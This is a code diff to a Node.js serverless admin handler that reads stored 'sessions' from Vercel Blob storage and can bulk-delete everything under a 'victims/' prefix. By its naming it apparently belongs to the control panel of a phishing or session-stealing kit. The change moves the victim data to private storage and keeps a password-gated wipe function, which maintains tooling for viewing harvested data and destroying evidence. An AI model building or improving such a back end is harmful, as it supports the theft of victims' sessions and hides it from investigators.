@@ -1,5 +1,5 @@
 const crypto = require('crypto');
-const { list, del } = require('@vercel/blob');
+const { list, del, get } = require('@vercel/blob');
 
 module.exports = async function handler(req, res) {
   const adminPass = process.env.ADMIN_PASSWORD;
@@ -24,8 +24,10 @@ module.exports = async function handler(req, res) {
     const sessions = [];
     for (const b of blobs) {
       try {
-        const r = await fetch(b.url);
-        if (r.ok) sessions.push(await r.json());
+        const r = await get(b.pathname, { access: 'private' });
+        if (!r) continue;
+        const text = r.blob ? await r.blob.text() : await new Response(r.stream).text();
+        sessions.push(JSON.parse(text));
       } catch (e) {}
     }
     sessions.sort((a, b) => String(b.t || '').localeCompare(String(a.t || '')));
@@ -37,13 +39,13 @@ module.exports = async function handler(req, res) {
     if (body.f === 1) {
       try {
         let cursor;
-        const urls = [];
+        const paths = [];
         do {
           const r = await list({ prefix: 'victims/', cursor });
-          (r.blobs || []).forEach(b => urls.push(b.url));
+          (r.blobs || []).forEach(b => paths.push(b.pathname));
           cursor = r.cursor;
         } while (cursor);
-        if (urls.length) await del(urls);
+        if (paths.length) await del(paths);
       } catch (e) {}
       return res.status(200).json({ ok: 1 });
     }
